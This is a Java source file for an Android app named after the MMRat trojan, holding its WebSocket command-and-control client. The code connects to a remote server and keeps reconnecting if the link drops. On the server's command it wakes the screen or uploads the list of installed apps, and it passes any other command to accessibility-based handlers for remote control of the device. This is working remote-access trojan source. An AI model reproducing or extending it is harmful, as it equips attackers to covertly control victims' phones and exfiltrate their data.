package com.example.mmrat_wannabe.retrofit;

import static com.example.mmrat_wannabe.Config.apiService;
import static com.example.mmrat_wannabe.Config.client;
import static com.example.mmrat_wannabe.Config.context;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.PowerManager;

import com.example.mmrat_wannabe.SmallActivity;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.util.List;

import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import retrofit2.Call;
import retrofit2.Callback;

public class RemoteWebSocketClient extends WebSocketListener {
    public static boolean isConnected = false;
    public static String command = null;

    public RemoteWebSocketClient() throws CertificateException, KeyStoreException, NoSuchAlgorithmException, IOException, KeyManagementException {

    }

    private void connect(Request request) {
        while (!isConnected) {
            try {
                client.newWebSocket(request, this);
                Thread.sleep(5000); // Wait for 5 seconds before the next attempt
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    // WebSocketListener callback when the connection is established
    @Override
    public void onOpen(WebSocket webSocket, Response response) {
        // WebSocket connection is established
        isConnected = true;
        webSocket.send("Phone connected.");
    }

    // WebSocketListener callback when a message is received
    @Override
    public void onMessage(WebSocket webSocket, String text) {
        // Handle incoming messages received from the WebSocket server
        System.out.println("SOCKET MESSAGE: " + text);
        handleReceivedData(webSocket,text);
    }

    // WebSocketListener callback when the connection is closed
    @Override
    public void onClosed(WebSocket webSocket, int code, String reason) {
        // WebSocket connection is closed
        isConnected = false;
        webSocket.close(1000, "Goodbye!");
        System.out.println("SOCKET CLOSE: " + code + " " + reason);
        connect(webSocket.request());
    }

    // WebSocketListener callback for any errors that occur during WebSocket communication
    @Override
    public void onFailure(WebSocket webSocket, Throwable t, Response response) {
        // Handle any errors that occur during WebSocket communication
        System.out.println("SOCKET FAILURE: " + t.getMessage());

        isConnected = false;

    }

    @Override
    public void onClosing(WebSocket webSocket, int code, String reason) {
        super.onClosing(webSocket, code, reason);
        isConnected = false;
    }

    private void handleReceivedData(WebSocket webSocket, String data){

        if(data.equals("wakeup")){
            wakeUpScreen();
        }
        else if(data.equals("installedapp")){
            uploadInstalledApp(getInstalledApp());
        }
        else{//run accessibility related command here therefore need to start SmallActivity to trigger onAccessibilityEvent
            command = data;
            Intent intent = new Intent(context, SmallActivity.class);
            context.startActivity(intent);
        }
        if(!webSocket.send("Command Received")){
            isConnected=false;
            connect(webSocket.request());
        }

    }

    public static void wakeUpScreen() {
        PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "app:doubleclickwakeup");
        wakeLock.acquire(1000); // Wake up the screen for one second
    }

    private void uploadInstalledApp(String data) {
        if (data != null) {
            Call<String> call = apiService.uploadInstalledApp(data);
            call.enqueue(new Callback<String>() {
                @Override
                public void onResponse(Call<String> call, retrofit2.Response<String> response) {
                    System.out.println(response.body());
                }

                @Override
                public void onFailure(Call<String> call, Throwable t) {
                    System.out.println("uploadInstalledApp: error");
                }
            });
        }
    }
    private String getInstalledApp() {
        StringBuilder packagesNames = new StringBuilder();
        // Get the PackageManager
        PackageManager pm = context.getPackageManager();

        // Get a list of installed applications
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo packageInfo : packages) {
            // The package name is a unique identifier for an app
            String packageName = packageInfo.packageName;
            packagesNames.append(packageName).append("\n");
        }

        return packagesNames.toString();
    }

}
